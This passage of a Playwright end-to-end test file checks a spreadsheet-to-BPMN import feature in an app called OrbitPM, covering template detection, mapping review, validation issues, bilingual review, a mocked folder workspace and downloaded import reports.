  const generator = page.getByRole('button', { name: /Generate with AI/i })
  if ((await generator.getAttribute('aria-expanded')) === 'false') await generator.click()
  await page.getByRole('tab', { name: 'Excel / CSV' }).click()
  const panel = page.getByRole('region', { name: 'Import Excel or CSV' })
  await expect(panel).toBeVisible()
  return panel
}

async function mandatorySpreadsheetUpload(
  panel: Locator,
  file: {
    readonly name: string
    readonly mimeType: string
    readonly buffer: Buffer
  },
  detected: 'official' | 'ordinary' | 'none' = 'official'
): Promise<void> {
  await panel.locator('input[type="file"][accept*=".xlsx"]').setInputFiles(file)
  if (detected === 'official') {
    await expect(panel.getByText(/Official OrbitPM template detected/i)).toBeVisible({
      timeout: 30_000
    })
  } else if (detected === 'ordinary') {
    await expect(panel.getByText(/Ordinary spreadsheet detected/i)).toBeVisible({
      timeout: 30_000
    })
  }
}

async function mandatorySpreadsheetReview(panel: Locator): Promise<void> {
  await panel.getByRole('button', { name: 'Validate and preview' }).click()
  await expect(panel.getByRole('heading', { name: 'Workbook validation' })).toBeVisible({
    timeout: 30_000
  })
}

async function mandatorySpreadsheetPrepare(panel: Locator): Promise<void> {
  await panel.getByRole('button', { name: 'Prepare BPMN files' }).click()
  await expect(panel.getByText(/BPMN files are ready/i)).toBeVisible({ timeout: 45_000 })
}

async function mandatorySpreadsheetCommit(panel: Locator): Promise<void> {
  await panel.getByRole('button', { name: 'Commit import' }).click()
  await expect(panel.getByText('Import committed successfully.')).toBeVisible({
    timeout: 45_000
  })
}

async function mandatorySpreadsheetIssue(panel: Locator, code: string): Promise<Locator> {
  const issue = panel
    .locator('.orbitpm-spreadsheet-validation__issue')
    .filter({ hasText: code })
    .first()
  await expect(issue).toBeVisible({ timeout: 30_000 })
  return issue
}

async function mandatorySpreadsheetDownloadText(download: {
  createReadStream(): Promise<NodeJS.ReadableStream | null>
}): Promise<string> {
  const stream = await download.createReadStream()
  if (!stream) throw new Error('Playwright did not retain the downloaded report')
  const chunks: Buffer[] = []
  for await (const chunk of stream) chunks.push(Buffer.from(chunk))
  return Buffer.concat(chunks).toString('utf8')
}

async function mandatorySpreadsheetInstallWorkspace(
  page: Page,
  options: MandatorySpreadsheetWorkspaceOptions = {}
): Promise<void> {
  await page.addInitScript((configuration) => {
    interface MandatoryMockFile {
      readonly kind: 'file'
      readonly name: string
      getFile(): Promise<{
        readonly name: string
        readonly size: number
        readonly type: string
        readonly lastModified: number
        text(): Promise<string>
        arrayBuffer(): Promise<ArrayBuffer>
      }>
      createWritable(): Promise<{
        write(value: string | Blob | ArrayBuffer | ArrayBufferView): Promise<void>
        close(): Promise<void>
        abort(): Promise<void>
      }>
      isSameEntry(other: unknown): Promise<boolean>
    }
    interface MandatoryMockDirectory {
      readonly kind: 'directory'
      readonly name: string
      readonly children: Map<string, MandatoryMockFile | MandatoryMockDirectory>
      queryPermission(): Promise<PermissionState>
      requestPermission(): Promise<PermissionState>
      entries(): AsyncIterableIterator<
        [string, MandatoryMockFile | MandatoryMockDirectory],
        void,
        unknown
      >
      getDirectoryHandle(
        name: string,
        options?: { readonly create?: boolean }
      ): Promise<MandatoryMockDirectory>
      getFileHandle(
        name: string,
        options?: { readonly create?: boolean }
      ): Promise<MandatoryMockFile>
      removeEntry(name: string, options?: { readonly recursive?: boolean }): Promise<void>
      isSameEntry(other: unknown): Promise<boolean>
    }

    const textEncoder = new TextEncoder()
    const textDecoder = new TextDecoder()
    const writeLog: string[] = []
    const writeAttempts: string[] = []
    let bpmnWriteCount = 0
    const missing = (): Error => {
      const error = new Error('Not found')
      error.name = 'NotFoundError'
      return error
    }
    const owned = (source: Uint8Array): Uint8Array<ArrayBuffer> => {
      const copy = new Uint8Array(new ArrayBuffer(source.byteLength))
      copy.set(source)
      return copy
    }
    const asBytes = async (
      value: string | Blob | ArrayBuffer | ArrayBufferView
    ): Promise<Uint8Array<ArrayBuffer>> => {
      if (typeof value === 'string') return owned(textEncoder.encode(value))
      if (value instanceof Blob) return owned(new Uint8Array(await value.arrayBuffer()))
      if (ArrayBuffer.isView(value)) {
        return owned(new Uint8Array(value.buffer, value.byteOffset, value.byteLength))
      }
      return owned(new Uint8Array(value))
    }
    const fileHandle = (name: string, path: string, initial = ''): MandatoryMockFile => {
      let bytes = owned(textEncoder.encode(initial))
      let modified = Date.now()
      const handle: MandatoryMockFile = {
        kind: 'file',
        name,
        async getFile() {
          const snapshot = owned(bytes)
          return {
            name,
            size: snapshot.byteLength,
            type: name.endsWith('.bpmn') ? 'application/xml' : 'application/octet-stream',
            lastModified: modified,
            text: async () => textDecoder.decode(snapshot),
            arrayBuffer: async () => owned(snapshot).buffer
          }
        },
        async createWritable() {
          let next = new Uint8Array(new ArrayBuffer(0))
          return {
            write: async (value) => {
              if (name.endsWith('.bpmn')) {
                bpmnWriteCount += 1
                writeAttempts.push(path)
                if (bpmnWriteCount === configuration.failBpmnWriteAt) {
                  throw new Error('Injected mandatory spreadsheet destination failure')
                }
              }
              next = await asBytes(value)
            },
            close: async () => {
              bytes = owned(next)
              modified = Date.now()
              writeLog.push(path)
            },
            abort: async () => undefined
          }
        },
        async isSameEntry(other) {
          return other === handle
        }
      }
      return handle
    }
    const directoryHandle = (name: string, path = ''): MandatoryMockDirectory => {
      const children = new Map<string, MandatoryMockFile | MandatoryMockDirectory>()
      const handle: MandatoryMockDirectory = {
        kind: 'directory',
        name,
        children,
        async queryPermission() {
          return 'granted'
        },
        async requestPermission() {
          return 'granted'
        },
        async *entries() {
          for (const entry of children) yield entry
        },
        async getDirectoryHandle(childName, childOptions = {}) {
          const existing = children.get(childName)
          if (existing) {
            if (existing.kind !== 'directory') throw new TypeError(`${childName} is a file`)
            return existing
          }
          if (!childOptions.create) throw missing()
          const childPath = path ? `${path}/${childName}` : childName
          const created = directoryHandle(childName, childPath)
          children.set(childName, created)
          return created
        },
        async getFileHandle(childName, childOptions = {}) {
          const existing = children.get(childName)
          if (existing) {
            if (existing.kind !== 'file') throw new TypeError(`${childName} is a directory`)
            return existing
          }
          if (!childOptions.create) throw missing()
          const childPath = path ? `${path}/${childName}` : childName
          const created = fileHandle(childName, childPath)
          children.set(childName, created)
          return created
        },
        async removeEntry(childName, removeOptions = {}) {
          const existing = children.get(childName)
          if (!existing) throw missing()
          if (
            existing.kind === 'directory' &&
            existing.children.size > 0 &&
            removeOptions.recursive !== true
          ) {
            throw new DOMException('Directory is not empty', 'InvalidModificationError')
          }
          children.delete(childName)
        },
        async isSameEntry(other) {
          return other === handle
        }
      }
      return handle
    }

    const root = directoryHandle('MandatorySpreadsheetWorkspace')
    for (const [path, contents] of Object.entries(configuration.seed ?? {})) {
      const parts = path.split('/').filter(Boolean)
      let directory = root
      for (const [partIndex, part] of parts.slice(0, -1).entries()) {
        let child = directory.children.get(part)
        if (!child) {
          const directoryPath = parts.slice(0, partIndex + 1).join('/')
          child = directoryHandle(part, directoryPath)
          directory.children.set(part, child)
        }
        if (child.kind !== 'directory') throw new TypeError(`${part} is a file`)
        directory = child
      }
      const name = parts.at(-1)
      if (name) directory.children.set(name, fileHandle(name, parts.join('/'), contents))
    }
    const entryAt = (path: string): MandatoryMockFile | MandatoryMockDirectory | undefined => {
      const parts = path.split('/').filter(Boolean)
      let current: MandatoryMockFile | MandatoryMockDirectory = root
      for (const part of parts) {
        if (current.kind !== 'directory') return undefined
        const next = current.children.get(part)
        if (!next) return undefined
        current = next
      }
      return current
    }
    const collectPaths = (directory: MandatoryMockDirectory, prefix = ''): string[] => {
      const paths: string[] = []
      for (const [name, entry] of directory.children) {
        const path = prefix ? `${prefix}/${name}` : name
        if (entry.kind === 'file') paths.push(path)
        else paths.push(...collectPaths(entry, path))
      }
      return paths.sort()
    }
    const collectTree = (directory: MandatoryMockDirectory, prefix = ''): string[] => {
      const paths: string[] = []
      for (const [name, entry] of directory.children) {
        const path = prefix ? `${prefix}/${name}` : name
        paths.push(`${entry.kind}:${path}`)
        if (entry.kind === 'directory') paths.push(...collectTree(entry, path))
      }
      return paths.sort()
    }
    ;(
      window as unknown as {
        showDirectoryPicker: () => Promise<MandatoryMockDirectory>
      }
    ).showDirectoryPicker = async () => root
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_PATHS__: () => string[]
        __MANDATORY_SPREADSHEET_TEXT__: (path: string) => Promise<string | undefined>
        __MANDATORY_SPREADSHEET_WRITES__: () => string[]
        __MANDATORY_SPREADSHEET_WRITE_ATTEMPTS__: () => string[]
        __MANDATORY_SPREADSHEET_TREE__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_PATHS__ = () => collectPaths(root)
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_TEXT__: (path: string) => Promise<string | undefined>
      }
    ).__MANDATORY_SPREADSHEET_TEXT__ = async (path) => {
      const entry = entryAt(path)
      return entry?.kind === 'file' ? await (await entry.getFile()).text() : undefined
    }
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_WRITES__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_WRITES__ = () => [...writeLog]
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_WRITE_ATTEMPTS__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_WRITE_ATTEMPTS__ = () => [...writeAttempts]
    ;(
      window as unknown as {
        __MANDATORY_SPREADSHEET_TREE__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_TREE__ = () => collectTree(root)
  }, options)
}

async function mandatorySpreadsheetWorkspacePaths(page: Page): Promise<string[]> {
  return await page.evaluate(() =>
    (
      window as unknown as {
        __MANDATORY_SPREADSHEET_PATHS__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_PATHS__()
  )
}

async function mandatorySpreadsheetWorkspaceText(
  page: Page,
  path: string
): Promise<string | undefined> {
  return await page.evaluate(
    (target) =>
      (
        window as unknown as {
          __MANDATORY_SPREADSHEET_TEXT__: (path: string) => Promise<string | undefined>
        }
      ).__MANDATORY_SPREADSHEET_TEXT__(target),
    path
  )
}

async function mandatorySpreadsheetWorkspaceWrites(page: Page): Promise<string[]> {
  return await page.evaluate(() =>
    (
      window as unknown as {
        __MANDATORY_SPREADSHEET_WRITES__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_WRITES__()
  )
}

async function mandatorySpreadsheetWorkspaceWriteAttempts(page: Page): Promise<string[]> {
  return await page.evaluate(() =>
    (
      window as unknown as {
        __MANDATORY_SPREADSHEET_WRITE_ATTEMPTS__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_WRITE_ATTEMPTS__()
  )
}

async function mandatorySpreadsheetWorkspaceTree(page: Page): Promise<string[]> {
  return await page.evaluate(() =>
    (
      window as unknown as {
        __MANDATORY_SPREADSHEET_TREE__: () => string[]
      }
    ).__MANDATORY_SPREADSHEET_TREE__()
  )
}

async function mandatorySpreadsheetOpenDirectory(page: Page): Promise<void> {
  await page.goto(MANDATORY_SPREADSHEET_URL, { waitUntil: 'load' })
  await page.getByRole('button', { name: 'Choose folder workspace', exact: true }).click()
  await expect(page.getByRole('heading', { name: 'Process catalog' })).toBeVisible({
    timeout: 30_000
  })
}

async function mandatorySpreadsheetBootSingleFile(page: Page): Promise<Locator> {
  await mandatorySpreadsheetForceSingleFile(page)
  await page.goto(MANDATORY_SPREADSHEET_URL, { waitUntil: 'load' })
  return await mandatorySpreadsheetOpenPanel(page)
}

for (const template of [
  {
    language: 'en',
    name: 'official English template',
    expectedIssue: 'translation-review-required',
    expectedSource: 'Simple approval'
  },
  {
    language: 'ar',
    name: 'official Arabic template',
    expectedIssue: 'translation-review-required',
    expectedSource: 'الموافقة البسيطة'
  },
  {
    language: 'bilingual',
    name: 'official bilingual template',
    expectedIssue: undefined,
    expectedSource: undefined
  }
] as const) {
  test(`mandatory spreadsheet X1: ${template.name} follows the production worker and language audit`, async ({
    page
  }) => {
    const panel = await mandatorySpreadsheetBootSingleFile(page)
    await mandatorySpreadsheetUpload(panel, {
      name: `mandatory-${template.language}.xlsx`,
      mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
      buffer: Buffer.from(mandatorySpreadsheetSimpleWorkbook(template.language))
    })
    await expect(
      panel.getByText(
        `Official OrbitPM template detected (${MANDATORY_SPREADSHEET_TEMPLATE_VERSION}). Mapping was applied automatically.`,
        { exact: true }
      )
    ).toBeVisible()
    await mandatorySpreadsheetReview(panel)
    await expect(panel.getByText('1 processes')).toBeVisible()
    await expect(panel.getByText('3 nodes')).toBeVisible()
    await expect(panel.getByText('2 flows')).toBeVisible()
    await expect(panel.locator('svg[data-testid="topology-Process_simple"]')).toBeVisible()
    await panel.getByRole('button', { name: 'Prepare BPMN files' }).click()

    if (template.expectedIssue) {
      await mandatorySpreadsheetIssue(panel, template.expectedIssue)
      await expect(panel.getByRole('button', { name: 'Commit import' })).toHaveCount(0)
      await panel.getByRole('button', { name: 'Open bilingual review' }).click()
      const translation = page.getByRole('dialog', { name: 'Complete bilingual XML review' })
      await expect(translation).toBeVisible()
      await expect(
        translation.getByText(template.expectedSource, { exact: true }).first()
      ).toBeVisible()
      await expect(translation).toContainText(
        template.language === 'en' ? 'Exact source (English)' : 'Exact source (Arabic)'
      )
      await expect(translation).toContainText(
        'The BPMN source is not changed until every row is valid'
      )
      await translation.getByRole('button', { name: 'Close bilingual XML review' }).click()
      await expect(translation).toHaveCount(0)
      await mandatorySpreadsheetIssue(panel, template.expectedIssue)
      await expect(panel.getByRole('button', { name: 'Commit import' })).toHaveCount(0)
    } else {
      await expect(panel.getByText(/BPMN files are ready/i)).toBeVisible({ timeout: 45_000 })
      await mandatorySpreadsheetCommit(panel)
      await expect(page.locator('.djs-element[data-element-id="Task_simple"]')).toBeVisible({
        timeout: 30_000
      })
    }
  })
}

test('mandatory spreadsheet X1/X5/X10: an ordinary noncanonical workbook exercises mapping review, deterministic inference, synthetic boundaries, and provenance reporting', async ({
  page
}) => {
  const panel = await mandatorySpreadsheetBootSingleFile(page)
  await mandatorySpreadsheetUpload(
    panel,
    {
      name: 'mandatory-ordinary-mapping.xlsx',
      mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
      buffer: Buffer.from(mandatorySpreadsheetOrdinaryMappingWorkbook())
    },
    'ordinary'
  )

  const steps = panel
    .locator('details')
    .filter({ hasText: 'Steps, IDs, order, type, bilingual details' })
  await expect(steps).toBeVisible()
  await steps.getByLabel('Worksheet').selectOption('Cover')
  await expect(steps.getByLabel('Header row')).toHaveValue('1')
  await steps.getByLabel('Worksheet').selectOption('Ops Register')
  await expect(steps.getByLabel('Header row')).toHaveValue('1')
  await steps.getByLabel('Header row').fill('2')

  const typeMapping = steps
    .locator('code')
    .filter({ hasText: /^type$/ })
    .locator('xpath=ancestor::label[1]')
  await expect(typeMapping.getByRole('combobox')).toHaveValue('Activity Category Type')
  await expect(typeMapping).toContainText('83% confidence')
  await expect(typeMapping.getByRole('checkbox')).not.toBeChecked()
  await panel.getByLabel('Default process ID').fill('Process_ordinary')
  await panel.getByLabel('Default process name (English)').fill('Ordinary mapped approval')
  await panel.getByLabel('Default process name (Arabic)').fill('موافقة معينة من جدول عادي')
  await panel.getByLabel('List delimiters').fill('|')
  await panel.getByLabel('Flow inference').selectOption('numeric-order')

  await mandatorySpreadsheetReview(panel)
  const lowConfidence = await mandatorySpreadsheetIssue(panel, 'low-confidence-mapping')
  await expect(lowConfidence).toHaveAttribute('data-severity', 'review')
  await expect(lowConfidence).toContainText('Ops Register')
  await expect(lowConfidence).toContainText('Activity Category Type')
  await expect(lowConfidence).toContainText('type')
  await expect(lowConfidence).toContainText('Repair guidance')
  await expect(panel.getByRole('button', { name: 'Prepare BPMN files' })).toHaveCount(0)

  await typeMapping.getByRole('checkbox').check()
  await mandatorySpreadsheetReview(panel)
  await expect(
    panel.getByText('1 missing IDs will be generated deterministically.', { exact: true })
  ).toBeVisible()
  const unknownType = await mandatorySpreadsheetIssue(panel, 'unknown-step-type')
  await expect(unknownType).toHaveAttribute('data-severity', 'review')
  await expect(unknownType).toContainText('Ops Register')
  await expect(unknownType).toContainText('Mystery work')
  await expect(unknownType).toContainText('mystery work')
  await expect(unknownType).toContainText('Repair guidance')
  await expect(
    panel.getByText('2 Start/End boundaries are proposed.', { exact: true })
  ).toBeVisible()

  await panel.getByLabel('Step type “Mystery work”').selectOption('userTask')
  await mandatorySpreadsheetReview(panel)
  await expect(panel.getByText('unknown-step-type')).toHaveCount(0)
  await mandatorySpreadsheetIssue(panel, 'synthetic-boundary-confirmation-required')
  await mandatorySpreadsheetIssue(panel, 'start-event-missing')
  await mandatorySpreadsheetIssue(panel, 'end-event-missing')
  await panel.getByLabel('Add the proposed bilingual Start/End events').click()
  await mandatorySpreadsheetReview(panel)
  await expect(panel.getByText('No workbook issues found.')).toBeVisible()
  await expect(panel.getByText('5 nodes')).toBeVisible()
  await expect(panel.getByText('4 flows')).toBeVisible()
  const topology = panel.locator('svg[data-testid="topology-Process_ordinary"]')
  await expect(topology).toBeVisible()
  await expect(topology.locator('[data-origin="inferred-order"]')).toHaveCount(2)
  await expect(topology.locator('[data-origin="synthetic-boundary"]')).toHaveCount(2)

  await mandatorySpreadsheetPrepare(panel)
  await mandatorySpreadsheetCommit(panel)
  await expect(
    page.locator('.djs-element[data-element-id="Step_process_ordinary_assess_request_r4_50a9bf02"]')
  ).toBeVisible({ timeout: 30_000 })
  await page.getByRole('button', { name: 'Source', exact: true }).click()
  const sourceDialog = page.getByRole('dialog', { name: 'BPMN XML source' })
  const xml = await sourceDialog.getByRole('textbox').inputValue()
  expect(xml).toContain('id="Step_process_ordinary_assess_request_r4_50a9bf02"')
  expect(xml).toContain('orbitpm:inputsEn="Request form&#10;Attachments"')
  expect(xml).toContain('orbitpm:inputsAr="نموذج الطلب&#10;المرفقات"')
  expect(xml).toContain('<bpmn:startEvent')
  expect(xml).toContain('<bpmn:endEvent')
  await sourceDialog.getByRole('button', { name: 'Close', exact: true }).last().click()

  const [download] = await Promise.all([
    page.waitForEvent('download'),
    panel.getByRole('button', { name: 'Download import report' }).click()
  ])
  const report = JSON.parse(await mandatorySpreadsheetDownloadText(download)) as {
    readonly reportVersion: number
    readonly planId: string
    readonly sourceFile: string
    readonly startedAt: string
    readonly completedAt: string
    readonly status: string
    readonly mapping: {
      readonly version: number
      readonly selectedSheets: {
        readonly steps: { readonly worksheet: string; readonly headerRow: number }
      }
      readonly fieldMappings: {
        readonly steps: Readonly<Record<string, string>>
      }
      readonly valueMappings: {
        readonly stepTypes: Readonly<Record<string, string>>
      }
      readonly delimiters: { readonly list: readonly string[] }
      readonly inference: { readonly flowMode: string }
    }
    readonly generatedIds: readonly {
      readonly entity: string
      readonly processId: string
      readonly generatedId: string
      readonly worksheet: string
      readonly row: number
    }[]
    readonly inferredFlows: readonly { readonly reason: string }[]
    readonly syntheticBoundaries: readonly {
      readonly processId: string
      readonly kind: string
      readonly nodeId: string
      readonly flowId: string
      readonly adjacentStepId: string
    }[]
    readonly issues: readonly {
      readonly code: string
      readonly severity: string
      readonly processId?: string
    }[]
    readonly skippedRows: readonly unknown[]
    readonly artifacts: readonly {
      readonly processId: string
      readonly destinationPath: string
      readonly checksumSha256: string
      readonly bytes: number
      readonly translation: Readonly<Record<string, unknown>>
    }[]
  }
  expect(report).toMatchObject({
    reportVersion: 1,
    sourceFile: 'mandatory-ordinary-mapping.xlsx',
    status: 'committed',
    skippedRows: []
  })
  expect(report.planId).toMatch(/^import-[0-9a-f]{16}$/)
  expect(Date.parse(report.startedAt)).not.toBeNaN()
  expect(Date.parse(report.completedAt)).toBeGreaterThanOrEqual(Date.parse(report.startedAt))
  expect(report.mapping.version).toBe(2)
  expect(report.mapping.selectedSheets.steps).toEqual({
    worksheet: 'Ops Register',
    headerRow: 2
  })
  expect(report.mapping.fieldMappings.steps).toMatchObject({
    process_id: 'Workflow ID',
    step_id: 'Step ID',
    order: 'Sequence Number',
    type: 'Activity Category Type',
    name_en: 'English Name',
    name_ar: 'Arabic Name',
    inputs_en: 'Inputs EN',
    inputs_ar: 'Inputs AR'
  })
  expect(report.mapping.valueMappings.stepTypes['mystery work']).toBe('userTask')
  expect(report.mapping.delimiters.list).toEqual(['|'])
  expect(report.mapping.inference.flowMode).toBe('numeric-order')
  expect(report.generatedIds).toEqual([
    {
      entity: 'node',
      processId: 'Process_ordinary',
      generatedId: 'Step_process_ordinary_assess_request_r4_50a9bf02',
      worksheet: 'Ops Register',
      row: 4
    }
  ])
  expect(report.inferredFlows.map(({ reason }) => reason).sort()).toEqual([
    'numeric-order',
    'numeric-order',
    'synthetic-boundary',
    'synthetic-boundary'
  ])
  expect(report.syntheticBoundaries.map(({ kind }) => kind).sort()).toEqual(['end', 'start'])
  expect(report.issues).toContainEqual(
    expect.objectContaining({
      code: 'pipeline-di-di.process-missing',
      severity: 'warning',
      processId: 'Process_ordinary'
    })
  )
  expect(report.issues.every(({ severity }) => severity === 'warning')).toBe(true)
  for (const boundary of report.syntheticBoundaries) {
    expect(boundary.processId).toBe('Process_ordinary')
    expect(boundary.nodeId).toMatch(/^Step_process_ordinary_synthetic_(?:start|end)_/)
    expect(boundary.flowId).toMatch(/^Flow_/)
    expect(boundary.adjacentStepId).toMatch(
      /^(?:Task_receive|Task_archive|Step_process_ordinary_assess_request_r4_50a9bf02)$/
    )
  }
  expect(report.artifacts).toHaveLength(1)
  expect(report.artifacts[0]).toMatchObject({
    processId: 'Process_ordinary',
    translation: { complete: true, missing: 0, invalid: 0, translationRequired: false }
  })
  expect(report.artifacts[0]!.destinationPath).toMatch(/\.bpmn$/)
  expect(report.artifacts[0]!.checksumSha256).toMatch(/^[0-9a-f]{64}$/)
  expect(report.artifacts[0]!.bytes).toBeGreaterThan(1_000)
})

test('mandatory spreadsheet X3/X10: a complex official workbook commits folders, pools, lanes, gateway defaults, and linked calls through every runtime validation surface', async ({
  page
}) => {
  await mandatorySpreadsheetInstallWorkspace(page, {
    seed: {
      'Ops/Existing/existing-review.bpmn': MANDATORY_SPREADSHEET_EXISTING_LINK_TARGET
    }
  })
  await mandatorySpreadsheetOpenDirectory(page)
  const panel = await mandatorySpreadsheetOpenPanel(page)
  await mandatorySpreadsheetUpload(panel, {
    name: 'mandatory-complex.xlsx',
    mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
    buffer: Buffer.from(mandatorySpreadsheetComplexWorkbook())
  })
  await mandatorySpreadsheetReview(panel)
  await expect(panel.getByText('No workbook issues found.')).toBeVisible()
  await expect(panel.getByText('3 processes')).toBeVisible()
  await expect(panel.getByText('12 nodes')).toBeVisible()
  await expect(panel.getByText('10 flows')).toBeVisible()
  await expect(panel.locator('svg[data-testid="topology-Process_linker"]')).toBeVisible()
  await expect(panel.locator('svg[data-testid="topology-Process_main"]')).toBeVisible()
  await expect(panel.locator('svg[data-testid="topology-Process_child"]')).toBeVisible()
  await mandatorySpreadsheetPrepare(panel)
  await expect(panel.getByText(/Ops\/Links\/linked-review\.bpmn/)).toBeVisible()
  await expect(panel.getByText(/Ops\/Intake\/main-approval\.bpmn/)).toBeVisible()
  await expect(panel.getByText(/Ops\/Shared\/shared-review\.bpmn/)).toBeVisible()
  await mandatorySpreadsheetCommit(panel)

  const paths = await mandatorySpreadsheetWorkspacePaths(page)
  expect(paths).toContain('Ops/Links/linked-review.bpmn')
  expect(paths).toContain('Ops/Intake/main-approval.bpmn')
  expect(paths).toContain('Ops/Shared/shared-review.bpmn')
  const linkerXml = await mandatorySpreadsheetWorkspaceText(page, 'Ops/Links/linked-review.bpmn')
  const mainXml = await mandatorySpreadsheetWorkspaceText(page, 'Ops/Intake/main-approval.bpmn')
  const childXml = await mandatorySpreadsheetWorkspaceText(page, 'Ops/Shared/shared-review.bpmn')
  expect(linkerXml).toContain('calledElement="Process_existing"')
  expect(linkerXml).toContain('orbitpm:nameEn="Run shared review"')
  expect(linkerXml).toContain('orbitpm:nameAr="تنفيذ المراجعة المشتركة"')
  expect(mainXml).toContain('default="Flow_main_default"')
  expect(mainXml).toContain('<bpmndi:BPMNDiagram')
  expect(mainXml).toContain('<dc:Bounds')
  expect(mainXml).toContain('<di:waypoint')
  expect(childXml).toContain('id="Process_child"')
  expect(childXml).toContain('<bpmndi:BPMNDiagram')

  await expect(page.locator('.djs-element[data-element-id="Call_linker_child"]')).toBeVisible({
    timeout: 45_000
  })
  await page.getByRole('button', { name: 'Validate', exact: true }).click()
  const validation = page.getByRole('dialog', { name: 'Validation Center' })
  await expect(validation).toBeVisible()
  await expect(validation.getByText('Validating…')).toHaveCount(0, { timeout: 45_000 })
  await expect(validation.getByText('The BPMN document is valid.')).toBeVisible()
  await expect(validation).toContainText('Errors: 0')
  await expect(validation).toContainText('Warnings: 0')
  await expect(validation.getByText('xsd.adapter-failure', { exact: true })).toHaveCount(0)
  await expect(validation.getByText('bpmnlint', { exact: false })).toHaveCount(0)
  const [validationDownload] = await Promise.all([
    page.waitForEvent('download'),
    validation.getByRole('button', { name: 'Export report' }).click()
  ])
  const validationReport = JSON.parse(
    await mandatorySpreadsheetDownloadText(validationDownload)
  ) as {
    readonly format: string
    readonly valid: boolean
    readonly stages: Readonly<Record<string, string>>
    readonly stats: {
      readonly processes: number
      readonly diagrams: number
      readonly planes: number
      readonly elements: number
    }
  }
  expect(validationReport.format).toBe('orbitpm-validation-report')
  expect(validationReport.valid).toBe(true)
  expect(validationReport.stages).toMatchObject({
    preflight: 'passed',
    moddle: 'passed',
    xsd: 'passed',
    bpmnlint: 'passed',
    structure: 'passed',
    semantic: 'passed',
    di: 'passed',
    orbitpm: 'passed'
  })
  expect(validationReport.stats.processes).toBe(1)
  expect(validationReport.stats.diagrams).toBe(1)
  expect(validationReport.stats.planes).toBe(1)
  expect(validationReport.stats.elements).toBeGreaterThanOrEqual(5)
  await validation.getByRole('button', { name: 'Close', exact: true }).last().click()

  const call = page.locator('.djs-element[data-element-id="Call_linker_child"]')
  const callBounds = await call.boundingBox()
  expect(callBounds?.width ?? 0).toBeGreaterThan(40)
  expect(callBounds?.height ?? 0).toBeGreaterThan(30)
  await expect(page.getByRole('button', { name: /unresolved link/i, exact: true })).toHaveCount(0)
  await page.getByRole('button', { name: /Home/i }).press('Enter')
  await expect(page.getByText(/Existing review/).first()).toBeVisible()
  await page.getByRole('button', { name: /Open Shared review/i }).click()
  await expect(page.locator('.djs-element[data-element-id="Task_child_review"]')).toBeVisible()
  await page.getByRole('button', { name: /EN⇄AR/ }).click()
  // The switch audits workspace localization and projects Arabic labels
  // asynchronously; give the projection the same bound this file uses for its
  // other worker-backed renders.
  await expect(
    page.locator('.djs-element[data-element-id="Task_child_review"] .djs-label', {
      hasText: 'التحقق من قواعد الجودة'
    })
  ).toBeVisible({ timeout: 20_000 })

  const [reportDownload] = await Promise.all([
    page.waitForEvent('download'),
    panel.getByRole('button', { name: 'Download import report' }).click()
  ])
  expect(reportDownload.suggestedFilename()).toMatch(/^orbitpm-import-report-import-[^.]+\.json$/)
  const report = JSON.parse(await mandatorySpreadsheetDownloadText(reportDownload)) as {
    readonly status: string
    readonly sourceFile: string
    readonly artifacts: readonly {
      readonly processId: string
      readonly destinationPath: string
      readonly checksumSha256: string
    }[]
    readonly mapping?: unknown
  }
  expect(report.status).toBe('committed')
  expect(report.sourceFile).toBe('mandatory-complex.xlsx')
  expect(report.artifacts).toHaveLength(3)
  expect(report.artifacts.map(({ processId }) => processId).sort()).toEqual([
    'Process_child',
    'Process_linker',
    'Process_main'
  ])
  expect(
    report.artifacts.every(({ checksumSha256 }) => /^[0-9a-f]{64}$/.test(checksumSha256))
  ).toBe(true)
  expect(report.mapping).toBeDefined()
})

test('mandatory spreadsheet X5: row-level repair and error matrix preserves worksheet, cell, and raw-value evidence', async ({
  page
}) => {
  const cases = [
    {
      kind: 'missing-id',
      code: undefined,
      text: '1 missing IDs will be generated deterministically.'
    },
    {
      kind: 'duplicate-id',
      code: 'node-id-duplicate',
      worksheet: 'Steps',
      cell: 'B4'
    },
    {
      kind: 'broken-reference',
      code: 'flow-target-missing',
      worksheet: 'Flows',
      raw: 'Missing_matrix'
    },
    {
      kind: 'unknown-type',
      code: 'unknown-step-type',
      worksheet: 'Steps',
      cell: 'D3',
      raw: 'Mystery work'
    },
    {
      kind: 'circular-lanes',
      code: 'participant-parent-cycle',
      worksheet: 'Participants'
    },
    {
      kind: 'invalid-defaults',
      code: 'multiple-default-flows',
      worksheet: 'Steps',
      secondaryCode: 'default-flow-has-condition'
    }
  ] as const

  const panel = await mandatorySpreadsheetBootSingleFile(page)
  for (const [index, scenario] of cases.entries()) {
    await test.step(scenario.kind, async () => {
      await mandatorySpreadsheetUpload(panel, {
        name: `mandatory-${scenario.kind}.xlsx`,
        mimeType: MANDATORY_SPREADSHEET_XLSX_MIME,
        buffer: Buffer.from(mandatorySpreadsheetValidationWorkbook(scenario.kind))
      })
      await mandatorySpreadsheetReview(panel)
      if (!scenario.code) {
        await expect(panel.getByText(scenario.text, { exact: true })).toBeVisible()
        await mandatorySpreadsheetPrepare(panel)
        await mandatorySpreadsheetCommit(panel)
        await page.getByRole('button', { name: 'Source', exact: true }).click()
        const sourceDialog = page.getByRole('dialog', { name: 'BPMN XML source' })
        const sourceXml = await sourceDialog.getByRole('textbox').inputValue()
        expect(sourceXml).toContain(
          '<bpmn:task id="Step_process_matrix_missing_id_review_r3_85fbb7e2"'
        )
        expect(sourceXml).not.toContain('id=""')
        await sourceDialog.getByRole('button', { name: 'Close', exact: true }).last().click()
        const [download] = await Promise.all([
          page.waitForEvent('download'),
          panel.getByRole('button', { name: 'Download import report' }).click()
        ])
        const report = JSON.parse(await mandatorySpreadsheetDownloadText(download)) as {
          readonly reportVersion: number
          readonly planId: string
          readonly status: string
          readonly generatedIds: readonly unknown[]
          readonly inferredFlows: readonly { readonly reason: string }[]
